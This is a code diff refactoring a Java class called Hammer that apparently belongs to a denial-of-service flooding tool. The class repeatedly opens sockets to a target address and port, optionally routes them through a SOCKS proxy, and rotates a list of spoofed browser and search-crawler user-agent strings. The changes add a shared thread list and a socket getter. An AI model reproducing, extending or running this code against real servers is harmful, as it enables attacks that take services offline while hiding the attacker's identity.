@@ -5,25 +5,12 @@ import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.net.Socket;
 import java.net.SocketAddress;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
 
 public class Hammer implements Runnable {
 	
-	private String address;
-	private int port;
-	
-	private boolean proxy;
-	private String phost;
-	private int pport;
-	
-	public Hammer(String address, int port, boolean proxy, String phost, int pport) {
-		this.address = address;
-		this.port = port;
-		this.proxy = proxy;
-		this.phost = phost;
-		this.pport = pport;
-	}
-
 	public static final String[] USERAGENTS = new String[] { "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)", "Googlebot/2.1 (http://www.googlebot.com/bot.html)", 
 		"Opera/9.20 (Windows NT 6.0; U; en)", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
@@ -43,13 +30,30 @@ public class Hammer implements Runnable {
 		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", 
 		"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)", 
 	};
+	
+	public static final List<Hammer> THREADS = new ArrayList<Hammer>();
+	
+	private String address;
+	private int port;
+	
+	private boolean proxy;
+	private String phost;
+	private int pport;
+	
+	private Socket socket;
+	
+	public Hammer(String address, int port, boolean proxy, String phost, int pport) {
+		this.address = address;
+		this.port = port;
+		this.proxy = proxy;
+		this.phost = phost;
+		this.pport = pport;
+	}
 
 	@Override
 	public void run() {
 		while (Main.running) {
-			try {
-				Socket socket;
-				
+			try {				
 				if (proxy) {
 					SocketAddress addr = new InetSocketAddress(phost, pport);
 					Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr);
@@ -92,6 +96,10 @@ public class Hammer implements Runnable {
 		String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 		
 		return Character.toString(chars.charAt(new Random().nextInt(chars.length())));
+	}
+
+	public Socket getSocket() {
+		return socket;
 	}
 
 }
